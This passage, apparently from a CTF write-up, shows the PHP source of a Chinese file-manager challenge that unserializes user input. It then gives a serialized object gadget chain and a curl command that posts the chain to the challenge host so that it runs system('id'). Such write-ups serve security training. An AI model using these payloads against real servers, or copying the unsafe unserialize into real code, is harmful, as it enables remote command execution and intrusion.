variable">$file_extension</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$file_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_extension</span><span class="token punctuation">,</span> <span class="token variable">$allowed_extensions</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p class='text-red-600'&gt;不允许的文件类型。只允许 txt, png, gif, jpg。&lt;/p&gt;"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                <span class="token variable">$unique_filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$file_extension</span><span class="token punctuation">;</span>                <span class="token variable">$upload_path</span> <span class="token operator">=</span> <span class="token variable">$upload_dir</span> <span class="token operator">.</span> <span class="token variable">$unique_filename</span><span class="token punctuation">;</span>                <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p class='text-green-600'&gt;文件上传成功！&lt;/p&gt;"</span><span class="token punctuation">;</span>                    <span class="token variable">$output</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;p class='text-gray-700'&gt;文件路径：&lt;code class='bg-gray-200 p-1 rounded'&gt;"</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$upload_path</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/code&gt;&lt;/p&gt;"</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p class='text-red-600'&gt;上传失败！&lt;/p&gt;"</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p class='text-red-600'&gt;请选择一个文件上传。&lt;/p&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'home'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit_md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$filename_param</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file_to_check'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file_to_check'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$filename_param</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$file_object</span> <span class="token operator">=</span> @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$filename_param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file_object</span> <span class="token operator">===</span> <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$file_object</span> <span class="token keyword">instanceof</span> <span class="token class-name">FileManager</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$file_object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileManager</span><span class="token punctuation">(</span><span class="token variable">$filename_param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$file_object</span><span class="token operator">-&gt;</span><span class="token function">getFileHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;p class='text-gray-600'&gt;请输入文件路径进行MD5校验。&lt;/p&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>文件管理系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.tailwindcss.com<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">        <span class="token selector">body</span> <span class="token punctuation">{</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Inter'</span><span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bg-gray-100 flex items-center justify-center min-h-screen px-4 py-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bg-white p-6 md:p-8 rounded-lg shadow-md w-full max-w-4xl mx-auto<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-3xl font-bold mb-6 text-gray-800 text-center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>文件管理系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex justify-center mb-6 space-x-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?action=home<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>py-2 px-4 rounded-lg font-semibold <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'home'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'bg-indigo-600 text-white'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'bg-indigo-100 text-indigo-800 hover:bg-indigo-200'</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?action=upload_file<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>py-2 px-4 rounded-lg font-semibold <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'upload_file'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'bg-blue-600 text-white'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'bg-blue-100 text-blue-800 hover:bg-blue-200'</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'home'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-lg text-gray-700 mb-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>欢迎使用文件管理系统。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-sm text-gray-500 mb-6<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    为了确保文件一致性和完整性，请在下载前校验md5值，完成下载后进行对比。                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-2xl font-bold mb-4 text-gray-800<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>文件列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>max-h-60 overflow-y-auto border border-gray-200 rounded-lg p-2 bg-gray-50<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>                    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">array_diff</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$upload_dir</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$files</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p class='text-gray-500'&gt;暂无文件。&lt;/p&gt;"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;ul class='text-left space-y-2'&gt;"</span><span class="token punctuation">;</span>                        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token variable">$upload_dir</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">;</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;li class='flex items-center justify-between p-2 bg-white rounded-md shadow-sm'&gt;"</span><span class="token punctuation">;</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;span class='text-gray-700 break-all mr-2'&gt;"</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/span&gt;"</span><span class="token punctuation">;</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div class='flex space-x-2'&gt;"</span><span class="token punctuation">;</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;a href='"</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"' download class='bg-blue-500 hover:bg-blue-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out'&gt;下载&lt;/a&gt;"</span><span class="token punctuation">;</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;form action='?action=home' method='POST' class='inline-block'&gt;"</span><span class="token punctuation">;</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;input type='hidden' name='file_to_check' value='"</span> <span class="token operator">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'&gt;"</span><span class="token punctuation">;</span>                             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;button type='submit' name='submit_md5' class='bg-purple-500 hover:bg-purple-600 text-white text-xs py-1 px-2 rounded-lg transition duration-300 ease-in-out'&gt;校验MD5&lt;/button&gt;"</span><span class="token punctuation">;</span>                             <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/form&gt;"</span><span class="token punctuation">;</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/div&gt;"</span><span class="token punctuation">;</span>                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/li&gt;"</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/ul&gt;"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token delimiter important">?&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>                <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mt-6 p-4 bg-gray-50 border border-gray-200 rounded-lg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lg font-semibold mb-2 text-gray-800<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>校验结果:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>                        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>                <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$action</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-2xl font-bold mb-4 text-gray-800 text-center<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?action=upload_file<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>space-y-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>block text-gray-700 text-sm font-bold mb-2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>选择文件:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>block w-full text-sm text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 focus:outline-none<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg transition duration-300 ease-in-out<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    上传                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>            <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mt-6 p-4 bg-gray-50 border border-gray-200 rounded-lg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-lg font-semibold mb-2 text-gray-800<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>上传结果:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>                    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mt-6 text-center text-sm text-gray-500<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                只允许上传 .txt, .png, .gif, .jpg 文件。            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>        <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">O:16:"ContentProcessor":2:{s:16:"processedContent";O:15:"FunctionInvoker":2:{s:12:"functionName";N;s:17:"functionArguments";N;}s:16:"callbackFunction";s:8:"var_dump";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">curl -s -X POST 'http://node10.anna.nssctf.cn:23261/index.php?action=home' \  -d 'file_to_check=O:11:"FileManager":2:{s:10:"targetFile";O:16:"ContentProcessor":2:{s:16:"processedContent";O:15:"FunctionInvoker":2:{s:12:"functionName";N;s:17:"functionArguments";N;}s:16:"callbackFunction";s:6:"system";}s:13:"responseData";s:4:"test";}' \  -d 'cmd=id &gt; upload/out.txt' \  -d 'method=performWriteOperation' \  -d 'var=processedContent' \  --raw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code 